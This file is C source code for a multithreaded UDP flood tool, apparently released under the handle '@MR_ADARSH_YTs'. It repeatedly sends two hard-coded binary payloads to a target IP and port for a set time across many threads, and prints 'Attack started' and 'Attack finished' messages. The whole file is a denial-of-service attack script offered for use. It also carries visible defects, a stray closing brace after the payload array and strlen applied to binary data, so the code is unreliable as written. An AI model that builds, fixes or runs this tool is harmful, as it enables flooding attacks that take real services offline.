#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./adarsh ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
    "\x0a\x25\x8a\x44\xab\x4c\x8c\x98\x04\x5d\x4f\x3d\x98\x02\x84\x3f\x40\x11\xe4\x43\x51\xfd\xa6\xf9\x34\xb7\x85\x80\x85\x01\x6a\x25\xe9\x10\x30\xfa\x0d\xa0\x43\x32\xe5\xe8\x30\x43\x50\x6e\x2c\xc4\x6c\x4c\x0f\x91\xbd\xba\xd8\x69\xa4\x02\xc4\x87\x17\xe4\xb9\xb2\x83\xc3\x6b\xbf\xe6\xf8\x8d\x84\xc7\xe5\x0d\x0b\x03\x75\x28\x8f\x28\x62\xfc\xfc\x36\x47\x4b\x64\x77\xc1\xe1\x7a\x3b\xb8\x4e\x95\x3e\xa2\x46\xd5\x4d\x71\x70\x1d\x68\x9f\x10\xc2\x44\x5c\x35\x22\x2e\x70\x90\x81\x9d\x90\x74\xdd\x34\xfb\x41\x00\xaa\x70\xe6\xb6\x57\x47\x21\xf3\x8f\x2a\xb6\xa8\x1d\x14\xe0\x15\x8c\xcf\xe3\x91\x5d\x3b\x9b\x36\x6e\x74\x82\x2c\xc0\x97\x36\x36\x79\xad\xef\x58\xa4\xd9\x93\xf1\x8b\xf0\x65\xc6\x2f\xfc\x61\x5a\xd3\xef\x51\x95\x65\x5f\x30\xd6\x43\xae\x90\xfe\xa8\x4c\x73\xed\xb2\xd8\x35\x9b\x70\xe8\xfc\xa4\x53\x14\x3e\x30\xc4\xd9\x58\x14\xa5\x7f\x18\xc1\xe1\x9f\xb8\x13\x6c\x91\x1e\x73\x07\xdf\x9b\xb2\x33\xda\xd3\x9e\xb7\x07\xf2\xa3\x4d\xe4\x35\xe7\xe5\x53\x7e\x18\x4a\x3a\x65\x91\x55\xfe\x07\x2a\xde\x05\x0d\xbc\x1a\xd5\xcf\x53\x8b\xeb\x4b\xc5\x90\xf6\xd4\x57\x0a\xc4\x1b\xa1\x67\x4f\x8f\x0e\x65\xd5\xb4\xe8\x7a\xea\x63\xaf\xca\xd7\x47\xbf\x49\x62\x46\x03\xce\x62\x46\x6d\xc1\x44\x51\x36\x36\x2c\x63\xbc\x82\xc7\x3b\xcc\x2b\x7b\xff\xb6\x86\x78\x32\xf1\xd8\x05\x6f\x8b\x08\x85\x90\x4f\x5d\x9f\xc4\x7f\x6a\x41\x51\x41\x6f\x3a\x06\x18\x46\x80\xdc\x89\xf5\xff\x49\x34\xd4\x88\x9e\x3c\xd5\xe1\x1f\x88\x62\x7d\x14\x5d\x43\x88\x7d\x34\x0d\xc9\x32\xe5",

    "\x14\x7b\x58\xa7\xf3\xa9\xa4\xdd\x30\x47\xdf\xa0\xfa\x3d\x60\xe0\x28\x86\x77\x05\xef\x45\x34\xaa\x90\xb6\x14\x12\xa1\x26\x01\x73\x83\x50\xa8\xc3\x1d\x23\xdb\xa3\x9f\x3b\x40\x2c\x62\xbc\xa4\x83\x4a\x8c\x9c\x83\xf4\x13\x8b\xe9\x17\xd8\xd7\x26\xe9\x11\x77\xe8\xdf\xfb\x1c\x88\x2c\x8b\x06\xe6\x48\xbf\xdf\xf1\x11\x44\xbb\xa9\x2a\x73\xf8\x90\x46\xd8\xac\x9a\x31\xe8\x96\xaf\xa4\x3e\xe6\x10\x85\x10\xdd\x8b\xc1\xc9\xe9\xc3\x13\x7d\x12\x83\x49"
};

    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: @MR_ADARSH_YTs %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished join @MR_ADARSH_YTs\n");
    return 0;
}
